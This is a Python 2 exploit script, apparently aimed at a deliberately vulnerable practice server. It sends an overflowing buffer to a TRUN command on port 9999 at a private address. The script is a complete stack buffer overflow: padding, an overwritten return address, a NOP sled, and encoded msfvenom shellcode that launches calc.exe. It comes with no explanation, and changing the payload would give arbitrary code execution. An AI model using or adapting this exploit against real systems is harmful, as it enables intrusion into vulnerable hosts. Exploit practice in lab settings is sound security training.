#!/usr/bin/python

import socket
import struct

target_address = "192.168.0.15"
target_port = 9999

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2003
eip = struct.pack("<I", 0x62501203)

# msfvenom -p windows/exec cmd=calc.exe -f c EXITFUNC=seh -e x86/shikata_ga_nai -b "x00x0a" -a x86 --platform windows 

shellcode = ("\xda\xc5\xba\x03\xb7\x42\xa4\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x31\x31\x57\x18\x03\x57\x18\x83\xc7\x07\x55\xb7\x58\xef\x1b"
"\x38\xa1\xef\x7b\xb0\x44\xde\xbb\xa6\x0d\x70\x0c\xac\x40\x7c"
"\xe7\xe0\x70\xf7\x85\x2c\x76\xb0\x20\x0b\xb9\x41\x18\x6f\xd8"
"\xc1\x63\xbc\x3a\xf8\xab\xb1\x3b\x3d\xd1\x38\x69\x96\x9d\xef"
"\x9e\x93\xe8\x33\x14\xef\xfd\x33\xc9\xa7\xfc\x12\x5c\xbc\xa6"
"\xb4\x5e\x11\xd3\xfc\x78\x76\xde\xb7\xf3\x4c\x94\x49\xd2\x9d"
"\x55\xe5\x1b\x12\xa4\xf7\x5c\x94\x57\x82\x94\xe7\xea\x95\x62"
"\x9a\x30\x13\x71\x3c\xb2\x83\x5d\xbd\x17\x55\x15\xb1\xdc\x11"
"\x71\xd5\xe3\xf6\x09\xe1\x68\xf9\xdd\x60\x2a\xde\xf9\x29\xe8"
"\x7f\x5b\x97\x5f\x7f\xbb\x78\x3f\x25\xb7\x94\x54\x54\x9a\xf2"
"\xab\xea\xa0\xb0\xac\xf4\xaa\xe4\xc4\xc5\x21\x6b\x92\xd9\xe3"
"\xc8\x62\x2b\x3e\xc4\xf3\x92\xab\xa5\x99\x24\x06\xe9\xa7\xa6"
"\xa3\x91\x53\xb6\xc1\x94\x18\x70\x39\xe4\x31\x15\x3d\x5b\x31"
"\x3c\x5e\x3a\xa1\xdc\x8f\xd9\x41\x46\xd0")

buffer += eip + "\x90" * 24 + shellcode

try:
        print "\nSending evil buffer..."
        s.connect((target_address, target_port))
        s.send("TRUN /.:/" + buffer + '\r\n')
        s.send("EXIT\r\n")
        s.close()
        print "\nDone!."
except:
        print "Could not connect to HTTP!"
